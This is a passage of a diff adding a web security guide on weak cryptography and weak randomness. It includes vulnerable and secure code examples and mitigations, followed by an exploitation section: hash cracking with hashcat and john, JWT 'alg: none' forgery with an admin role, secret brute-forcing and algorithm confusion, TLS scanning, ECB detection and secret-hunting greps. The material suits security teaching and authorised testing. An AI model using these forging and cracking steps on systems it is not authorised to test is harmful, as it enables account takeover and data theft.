+<td>DES, 3DES, RC4, AES-ECB</td>
+<td>AES-256-GCM, ChaCha20-Poly1305</td>
+</tr>
+<tr>
+<td>Asymmetric encryption</td>
+<td>RSA &lt; 2048-bit, PKCS#1 v1.5</td>
+<td>RSA-OAEP 2048+, ECC Curve25519</td>
+</tr>
+<tr>
+<td>TLS protocols</td>
+<td>SSLv2, SSLv3, TLS 1.0, TLS 1.1</td>
+<td>TLS 1.2 (limited), TLS 1.3</td>
+</tr>
+<tr>
+<td>JWT algorithm</td>
+<td><code>none</code>, HS256 with weak secret</td>
+<td>RS256, ES256 with strong keys</td>
+</tr>
+<tr>
+<td>Key storage</td>
+<td>Hardcoded in source / config files</td>
+<td>Secrets manager, HSM, env vars</td>
+</tr>
+</tbody>
+</table>
+<h3 id="why-it-matters">
+  Why It Matters
+  <a class="anchor" href="#why-it-matters">#</a>
+</h3>
+<p>Most crypto bugs aren&rsquo;t in the algorithm, they&rsquo;re in how it&rsquo;s used. The same AES can be secure or completely broken depending on mode, IV, key management, and whether integrity checking is applied. Your job is finding those misconfigurations.</p>
+<h2 id="attack-surface">
+  Attack Surface
+  <a class="anchor" href="#attack-surface">#</a>
+</h2>
+<ul>
+<li><strong>Login / password storage:</strong> hashed with MD5 or SHA-1, unsalted, or stored in plaintext</li>
+<li><strong>Session tokens / JWTs:</strong> weak secrets, no signature verification, <code>alg: none</code></li>
+<li><strong>Data in transit:</strong> HTTP instead of HTTPS, TLS downgrade, weak cipher suites</li>
+<li><strong>Data at rest:</strong> AES-ECB mode, reused IVs, no authenticated encryption</li>
+<li><strong>API keys / secrets:</strong> hardcoded in source code, JavaScript files, or git history</li>
+<li><strong>Password reset / verification tokens:</strong> low entropy, MD5-hashed, predictable</li>
+<li><strong>Encrypted cookies:</strong> CBC without MAC, reused key/IV pairs</li>
+<li><strong>Certificate validation:</strong> missing hostname check, self-signed accepted silently</li>
+</ul>
+<h2 id="weak-randomness--insufficient-entropy">
+  Weak Randomness / Insufficient Entropy
+  <a class="anchor" href="#weak-randomness--insufficient-entropy">#</a>
+</h2>
+<p>Weak randomness occurs when security-sensitive values are generated using predictable, low-entropy, or non-cryptographic random sources. This issue commonly affects password reset tokens, OTPs, session IDs, CSRF tokens, API keys, encryption keys, IVs, and nonces.</p>
+<p>The application may use strong cryptographic algorithms, but if the random values used with them are predictable or reused, the overall security of the implementation can still be broken.</p>
+<h3 id="owasp-mapping">
+  OWASP Mapping
+  <a class="anchor" href="#owasp-mapping">#</a>
+</h3>
+<ul>
+<li><strong>A02:2021 - Cryptographic Failures</strong></li>
+<li><strong>A07:2021 - Identification and Authentication Failures</strong></li>
+<li><strong>A05:2021 - Security Misconfiguration</strong></li>
+</ul>
+<h3 id="related-cwes">
+  Related CWEs
+  <a class="anchor" href="#related-cwes">#</a>
+</h3>
+<ul>
+<li>CWE-331: Insufficient Entropy</li>
+<li>CWE-330: Use of Insufficiently Random Values</li>
+<li>CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator</li>
+<li>CWE-335: Incorrect Usage of Seeds in Pseudo-Random Number Generator</li>
+</ul>
+<h3 id="common-weak-randomness-issues">
+  Common Weak Randomness Issues
+  <a class="anchor" href="#common-weak-randomness-issues">#</a>
+</h3>
+<ul>
+<li>Tokens generated using <code>Math.random()</code></li>
+<li>OTPs generated using <code>rand()</code> or other weak random functions</li>
+<li>Password reset tokens generated using timestamps</li>
+<li>Tokens generated using user ID, email, username, or phone number</li>
+<li>Sequential or incremental reset tokens</li>
+<li>Short OTPs without rate limiting</li>
+<li>Reused IVs or nonces in encryption</li>
+<li>API keys with insufficient length or entropy</li>
+<li>Session IDs with visible patterns</li>
+<li>CSRF tokens that remain static across sessions</li>
+<li>Tokens that do not expire</li>
+<li>Tokens that remain valid after use</li>
+</ul>
+<h3 id="vulnerable-examples">
+  Vulnerable Examples
+  <a class="anchor" href="#vulnerable-examples">#</a>
+</h3>
+<h4 id="javascript---weak-token-generation">
+  JavaScript - Weak Token Generation
+  <a class="anchor" href="#javascript---weak-token-generation">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Weak: Math.random() is not cryptographically secure
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">token</span>);
+</span></span></code></pre></div><h4 id="php---weak-otp-generation">
+  PHP - Weak OTP Generation
+  <a class="anchor" href="#php---weak-otp-generation">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Weak: rand() is not suitable for security-sensitive OTP generation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$otp <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">100000</span>, <span style="color:#ae81ff">999999</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $otp;
+</span></span></code></pre></div><h4 id="python---time-based-token">
+  Python - Time-Based Token
+  <a class="anchor" href="#python---time-based-token">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Weak: token is generated using current time and can be predictable</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(str(time<span style="color:#f92672">.</span>time())<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>print(token)
+</span></span></code></pre></div><h3 id="secure-examples">
+  Secure Examples
+  <a class="anchor" href="#secure-examples">#</a>
+</h3>
+<h4 id="javascript--nodejs">
+  JavaScript / Node.js
+  <a class="anchor" href="#javascript--nodejs">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Secure: uses cryptographically secure random bytes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;crypto&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">32</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#34;hex&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">token</span>);
+</span></span></code></pre></div><h4 id="php">
+  PHP
+  <a class="anchor" href="#php">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Secure: random_bytes() is cryptographically secure
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$token <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">32</span>));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $token;
+</span></span></code></pre></div><h4 id="python">
+  Python
+  <a class="anchor" href="#python">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Secure: secrets module is designed for security-sensitive randomness</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secrets
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> secrets<span style="color:#f92672">.</span>token_urlsafe(<span style="color:#ae81ff">32</span>)
+</span></span><span style="display:flex;"><span>print(token)
+</span></span></code></pre></div><h4 id="java">
+  Java
+  <a class="anchor" href="#java">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.security.SecureRandom<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Base64<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SecureToken</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        SecureRandom secureRandom <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SecureRandom<span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> tokenBytes <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span><span style="color:#ae81ff">32</span><span style="color:#f92672">];</span>
+</span></span><span style="display:flex;"><span>        secureRandom<span style="color:#f92672">.</span><span style="color:#a6e22e">nextBytes</span><span style="color:#f92672">(</span>tokenBytes<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String token <span style="color:#f92672">=</span> Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">getUrlEncoder</span><span style="color:#f92672">().</span><span style="color:#a6e22e">withoutPadding</span><span style="color:#f92672">().</span><span style="color:#a6e22e">encodeToString</span><span style="color:#f92672">(</span>tokenBytes<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>token<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="testing-for-weak-randomness">
+  Testing for Weak Randomness
+  <a class="anchor" href="#testing-for-weak-randomness">#</a>
+</h3>
+<p>Collect multiple tokens and check whether they follow any predictable pattern.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..20<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  curl -s -X POST &lt;https://target.com/reset-password&gt; <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -d <span style="color:#e6db74">&#34;email=test@example.com&#34;</span> | grep -oE <span style="color:#e6db74">&#39;[A-Za-z0-9_-]{10,}&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Check for:</p>
+<ul>
+<li>Repeated tokens</li>
+<li>Incremental values</li>
+<li>Same prefix or suffix</li>
+<li>Timestamp-like patterns</li>
+<li>Short token length</li>
+<li>Base64 values that decode to predictable data</li>
+<li>Tokens linked to user ID, email, or username</li>
+<li>OTPs that can be brute-forced due to missing rate limiting</li>
+<li>Tokens that remain valid after use</li>
+<li>Tokens that do not expire</li>
+</ul>
+<h3 id="example-token-pattern-issues">
+  Example Token Pattern Issues
+  <a class="anchor" href="#example-token-pattern-issues">#</a>
+</h3>
+<table>
+<thead>
+<tr>
+<th>Token Behavior</th>
+<th>Possible Issue</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>100001</code>, <code>100002</code>, <code>100003</code></td>
+<td>Sequential token generation</td>
+</tr>
+<tr>
+<td>Same token generated multiple times</td>
+<td>Token reuse or insufficient entropy</td>
+</tr>
+<tr>
+<td>Token contains user ID</td>
+<td>Predictable token structure</td>
+</tr>
+<tr>
+<td>Token changes based on current time</td>
+<td>Timestamp-based generation</td>
+</tr>
+<tr>
+<td>4-digit OTP with no rate limit</td>
+<td>Brute-forceable OTP</td>
+</tr>
+<tr>
+<td>Static CSRF token</td>
+<td>Weak CSRF protection</td>
+</tr>
+</tbody>
+</table>
+<h3 id="impact">
+  Impact
+  <a class="anchor" href="#impact">#</a>
+</h3>
+<p>Weak randomness can lead to:</p>
+<ul>
+<li>Account takeover through predictable password reset tokens</li>
+<li>OTP brute force</li>
+<li>Session hijacking</li>
+<li>CSRF bypass</li>
+<li>API key guessing</li>
+<li>Token forgery</li>
+<li>Authentication bypass</li>
+<li>Encryption compromise due to reused IVs or nonces</li>
+</ul>
+<h3 id="mitigation">
+  Mitigation
+  <a class="anchor" href="#mitigation">#</a>
+</h3>
+<ul>
+<li>Use cryptographically secure random number generators.</li>
+<li>Generate at least 128 bits of entropy for security-sensitive tokens.</li>
+<li>Use 256 bits of entropy for high-value tokens such as API keys.</li>
+<li>Expire password reset and verification tokens quickly.</li>
+<li>Invalidate tokens after first use.</li>
+<li>Apply rate limiting on OTP and token validation endpoints.</li>
+<li>Do not generate tokens using timestamps, user IDs, emails, usernames, or phone numbers.</li>
+<li>Do not use <code>Math.random()</code>, <code>rand()</code>, or similar weak functions for security-sensitive values.</li>
+<li>Use secure libraries:
+<ul>
+<li>Python: <code>secrets</code></li>
+<li>Node.js: <code>crypto.randomBytes</code></li>
+<li>PHP: <code>random_bytes</code></li>
+<li>Java: <code>SecureRandom</code></li>
+<li>Go: <code>crypto/rand</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="exploiting-weak-cryptography">
+  Exploiting Weak Cryptography
+  <a class="anchor" href="#exploiting-weak-cryptography">#</a>
+</h2>
+<h3 id="1-cracking-weak-password-hashes">
+  1. Cracking Weak Password Hashes
+  <a class="anchor" href="#1-cracking-weak-password-hashes">#</a>
+</h3>
+<p>When a database is breached or hashes leak, fast algorithms like MD5 and SHA-1 fall in seconds to minutes. No salt = rainbow table attack.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># MD5 / SHA-1 cracking with hashcat</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">0</span> hashes.txt rockyou.txt        <span style="color:#75715e"># MD5</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">100</span> hashes.txt rockyou.txt      <span style="color:#75715e"># SHA-1</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">1400</span> hashes.txt rockyou.txt     <span style="color:#75715e"># SHA-256 (unsalted)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># With rules for better coverage</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">0</span> hashes.txt rockyou.txt -r best64.rule
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># john the ripper</span>
+</span></span><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>raw-md5 hashes.txt --wordlist<span style="color:#f92672">=</span>rockyou.txt
+</span></span></code></pre></div><p>Identify hash type before cracking:</p>
+<pre tabindex="0"><code>$1$...          → MD5crypt
+$2y$...         → bcrypt (expensive — don&#39;t bother without GPU farm)
+$5$...          → SHA-256crypt
+5f4dcc3b...     → raw MD5 (32 hex chars, no prefix — very fast to crack)
+da39a3ee...     → raw SHA-1 (40 hex chars)
+</code></pre><h3 id="2-jwt--alg-none-bypass">
+  2. JWT — <code>alg: none</code> Bypass
+  <a class="anchor" href="#2-jwt--alg-none-bypass">#</a>
+</h3>
+<p>Some JWT libraries accept unsigned tokens if <code>&quot;alg&quot;: &quot;none&quot;</code> is set in the header. Signature verification is skipped entirely — payload can be freely modified.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Decode the existing JWT</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Header: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload: eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2 — Craft malicious header + payload</span>
+</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#39;{&#34;alg&#34;:&#34;none&#34;,&#34;typ&#34;:&#34;JWT&#34;}&#39;</span> | base64 | tr -d <span style="color:#e6db74">&#39;=&#39;</span>
+</span></span><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#39;{&#34;sub&#34;:&#34;user1&#34;,&#34;role&#34;:&#34;admin&#34;}&#39;</span> | base64 | tr -d <span style="color:#e6db74">&#39;=&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3 — Assemble with empty signature (trailing dot is required)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJhZG1pbiJ9.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Also try case variations the library might accept:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34;alg&#34;: &#34;None&#34;  /  &#34;NONE&#34;  /  &#34;nOnE&#34;</span>
+</span></span></code></pre></div><p>Use <strong>jwt_tool</strong> or <strong>Burp JWT Editor</strong> extension to automate this cleanly.</p>
+<h3 id="3-jwt--weak-secret-brute-force">
+  3. JWT — Weak Secret Brute Force
+  <a class="anchor" href="#3-jwt--weak-secret-brute-force">#</a>
+</h3>
+<p>HS256 tokens are signed with a shared secret. If the secret is weak or default, crack it offline — no noise, no requests to the server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># hashcat — GPU-accelerated, fastest option</span>
+</span></span><span style="display:flex;"><span>hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">16500</span> jwt.txt /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># jwt_tool — built-in crack mode</span>
+</span></span><span style="display:flex;"><span>python3 jwt_tool.py &lt;JWT&gt; -C -d /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># john</span>
+</span></span><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>HMAC-SHA256 --wordlist<span style="color:#f92672">=</span>rockyou.txt jwt.txt
+</span></span></code></pre></div><p>Common weak JWT secrets to try first: <code>secret</code>, <code>password</code>, <code>123456</code>, <code>jwt</code>, <code>key</code>, <code>test</code>, app name, domain name.</p>
+<p>Once cracked — forge any payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> jwt
+</span></span><span style="display:flex;"><span>forged <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#34;sub&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>}, <span style="color:#e6db74">&#34;secret&#34;</span>, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)
+</span></span></code></pre></div><h3 id="4-jwt--algorithm-confusion-rs256--hs256">
+  4. JWT — Algorithm Confusion (RS256 → HS256)
+  <a class="anchor" href="#4-jwt--algorithm-confusion-rs256--hs256">#</a>
+</h3>
+<p>If the server uses RS256 (asymmetric), an attacker can switch to HS256 and sign the token with the <strong>public key</strong> as the HMAC secret — exploiting libraries that trust the <code>alg</code> field from =the token header.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Step 1 — Get the server&#39;s public key</span>
+</span></span><span style="display:flex;"><span>openssl s_client -connect target.com:443 2&gt;/dev/null | <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  sed -n <span style="color:#e6db74">&#39;/-----BEGIN/,/-----END/p&#39;</span> &gt; cert.pem
+</span></span><span style="display:flex;"><span>openssl x509 -pubkey -noout -in cert.pem &gt; pubkey.pem
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2 — Sign forged HS256 token with the public key as secret</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use jwt_tool or Burp JWT Editor (Algorithm Confusion attack option)</span>
+</span></span><span style="display:flex;"><span>python3 jwt_tool.py &lt;JWT&gt; -X k -pk pubkey.pem
+</span></span></code></pre></div><h3 id="5-tls--weak-protocol--cipher-detection">
+  5. TLS — Weak Protocol / Cipher Detection
+  <a class="anchor" href="#5-tls--weak-protocol--cipher-detection">#</a>
+</h3>
+<p>Test what TLS versions and ciphers a server actually accepts. Old cipher suites and protocols still show up in legacy and misconfigured systems.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># testssl.sh — most comprehensive, covers protocols, ciphers, known vulns</span>
+</span></span><span style="display:flex;"><span>./testssl.sh --full target.com:443
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Quick checks</span>
+</span></span><span style="display:flex;"><span>./testssl.sh --protocols target.com:443    <span style="color:#75715e"># SSLv3, TLS 1.0, 1.1 support</span>
+</span></span><span style="display:flex;"><span>./testssl.sh --ciphers target.com:443      <span style="color:#75715e"># RC4, 3DES, EXPORT ciphers</span>
+</span></span><span style="display:flex;"><span>./testssl.sh --vulnerable target.com:443   <span style="color:#75715e"># POODLE, BEAST, CRIME, Heartbleed</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sslscan</span>
+</span></span><span style="display:flex;"><span>sslscan target.com:443
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nmap</span>
+</span></span><span style="display:flex;"><span>nmap --script ssl-enum-ciphers -p <span style="color:#ae81ff">443</span> target.com
+</span></span></code></pre></div><p>Findings that are immediately reportable: SSLv3 / TLS 1.0 enabled, RC4 or 3DES ciphers, EXPORT ciphers, no HSTS header, certificate using SHA-1 or MD5 signature.</p>
+<h3 id="6-aes-ecb-mode--pattern-detection">
+  6. AES-ECB Mode — Pattern Detection
+  <a class="anchor" href="#6-aes-ecb-mode--pattern-detection">#</a>
+</h3>
+<p>ECB encrypts identical plaintext blocks to identical ciphertext blocks. This leaks structure — attackers can detect repeated blocks, infer plaintext, and sometimes manipulate ciphertext without decrypting.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Detect ECB mode — submit repeated input and look for repeated output blocks</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send 48 identical bytes (3 x 16-byte blocks)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">48</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;&lt;https://target.com/encrypt&gt;&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;input&#34;</span>: payload})
+</span></span><span style="display:flex;"><span>ct <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;ciphertext&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Split into 16-byte blocks and check for repeats</span>
+</span></span><span style="display:flex;"><span>blocks <span style="color:#f92672">=</span> [ct[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ct), <span style="color:#ae81ff">16</span>)]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(blocks) <span style="color:#f92672">!=</span> len(set(blocks)):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[ECB DETECTED] Repeated blocks found — ECB mode confirmed&#34;</span>)
+</span></span></code></pre></div><p>What ECB detection enables: block manipulation attacks, byte-at-a-time plaintext recovery, CBC bit-flip if misidentified as CBC.</p>
+<h3 id="7-hardcoded-keys--secrets-in-source">
+  7. Hardcoded Keys / Secrets in Source
+  <a class="anchor" href="#7-hardcoded-keys--secrets-in-source">#</a>
+</h3>
+<p>Secrets embedded in code, JS files, or git history are directly exploitable — no cracking required.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Grep source code</span>
+</span></span><span style="display:flex;"><span>grep -rE <span style="color:#e6db74">&#34;(api_key|secret|password|token|key)\s*=\s*[\&#34;&#39;][^\&#34;&#39;]{8,}&#34;</span> . <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --include<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*.js&#34;</span> --include<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*.py&#34;</span> --include<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*.php&#34;</span> --include<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*.env&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Search git history</span>
+</span></span><span style="display:flex;"><span>git log --all --full-history
+</span></span><span style="display:flex;"><span>git diff &lt;commit&gt;^ &lt;commit&gt;
+</span></span><span style="display:flex;"><span>git grep <span style="color:#e6db74">&#34;secret&#34;</span> <span style="color:#66d9ef">$(</span>git rev-list --all<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># truffleHog — entropy-based secret scanning</span>
+</span></span><span style="display:flex;"><span>trufflehog git file://. --json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gitleaks</span>
+</span></span><span style="display:flex;"><span>gitleaks detect --source . --report-format json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In JavaScript bundles served by the app</span>
+</span></span><span style="display:flex;"><span>curl -s &lt;https://target.com/static/app.js&gt; | grep -E <span style="color:#e6db74">&#34;(apiKey|secret|token)\s*[:=]\s*[\&#34;&#39;][^\&#34;&#39;]{10,}&#34;</span>
+</span></span></code></pre></div><h3 id="8-http-instead-of-https--missing-hsts">
+  8. HTTP Instead of HTTPS / Missing HSTS
+  <a class="anchor" href="#8-http-instead-of-https--missing-hsts">#</a>
+</h3>
+<p>Sensitive data transmitted over plain HTTP is trivially intercepted. Missing HSTS allows protocol downgrade even when HTTPS exists.</p>
